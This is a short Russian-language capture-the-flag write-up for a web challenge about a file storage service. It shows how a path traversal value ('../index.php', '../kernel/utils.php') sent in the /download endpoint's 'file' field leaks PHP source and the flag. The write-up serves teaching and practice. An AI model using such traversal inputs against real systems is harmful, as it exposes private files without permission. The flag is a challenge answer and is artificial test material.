# Web 50 / Защищенное хранилище

> Нам удалось выяснить, что доктор Дум использует защищенное хранилище, чтобы прятать свои планы. Нужно срочно выяснить, что он от нас скрывает.

Заходим на [http://zombie.breakingbrain.org:8081](http://zombie.breakingbrain.org:8081).

Проверяем исходный код страницы, куки, location storage, robots.txt и т.д. Пусто.

Пробуем воспользоваться сервисом. Выбираем JPG картинку и жмём **Upload**. На выходе получаем хэш:

> File uploaded successfully: 70785cb6331f905953f1d57cc1d27a6c

Вводим его в поле на главной странице и нажимаем **Download**. Сервис делает `POST` запрос на `/download` с полем `file`, в котором наш введенный хэш, и выдаёт нам кракозябры, т.к. в заголовках почему-то `Content-Type: text/html`.

Пробуем LFI (Local File Inclusion). В поле `file` отправляем `../index.php`. В ответе видим небольшой кусочек PHP кода:

```php
<?php
declare(strict_types=1);
?>
<html>

<head>
	<title>Image storage</title>

...
```

Исследуем другие файлы.

../download.php

```php
<?php
declare(strict_types=1);

require_once 'kernel/utils.php';

...
```

../kernel/utils.php

```php
<?php
declare(strict_types=1);

// ITF{D1R_TR@V3RSAL}

defined('ALLOWED_IMG_MIMETYPES') || define('ALLOWED_IMG_MIMETYPES', [
    'image/jpeg',
    'image/jpg'
]);

...
```

Флаг наш.
